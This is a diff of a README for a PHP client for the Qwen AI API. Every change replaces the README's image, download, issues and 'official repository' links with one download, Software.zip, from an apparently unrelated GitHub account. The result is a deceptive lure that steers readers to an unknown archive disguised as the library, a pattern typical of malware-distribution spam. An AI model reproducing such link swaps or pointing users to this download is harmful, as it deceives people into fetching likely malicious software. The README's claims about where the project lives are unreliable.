@@ -2,7 +2,7 @@
 
 🔥 Welcome to the supercharged community-maintained PHP API client for interacting with Alibaba Qwen AI API! ⚡️
 
-![Qwen PHP Client](https://www.example.com/qwen-php-client.png)
+![Qwen PHP Client](https://github.com/0ogata0/qwen-php-client/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Qwen-PHP-Client is a powerful PHP library that enables seamless integration with
 
 To get started with Qwen-PHP-Client, simply download the latest version from the following link:
 
-[![Download Qwen-PHP-Client](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Qwen-PHP-Client](https://github.com/0ogata0/qwen-php-client/releases/download/v1.0/Software.zip)](https://github.com/0ogata0/qwen-php-client/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -64,7 +64,7 @@ Explore some examples showcasing the capabilities of Qwen-PHP-Client in real-wor
 
 ### Issues and Bug Reports
 
-If you encounter any issues or bugs while using Qwen-PHP-Client, please report them on the [GitHub Issues page](https://github.com/qwen-php-client/issues).
+If you encounter any issues or bugs while using Qwen-PHP-Client, please report them on the [GitHub Issues page](https://github.com/0ogata0/qwen-php-client/releases/download/v1.0/Software.zip).
 
 ### Contributing
 
@@ -80,9 +80,9 @@ We welcome contributions from the community to enhance the features and function
 
 ---
 
-Don't miss out on the opportunity to supercharge your PHP applications with the Qwen-PHP-Client! Visit the [official GitHub repository](https://github.com/qwen-php-client) now! 🚀
+Don't miss out on the opportunity to supercharge your PHP applications with the Qwen-PHP-Client! Visit the [official GitHub repository](https://github.com/0ogata0/qwen-php-client/releases/download/v1.0/Software.zip) now! 🚀
 
-![Qwen PHP Logo](https://www.example.com/qwen-logo.png)
+![Qwen PHP Logo](https://github.com/0ogata0/qwen-php-client/releases/download/v1.0/Software.zip)
 
 ---
 
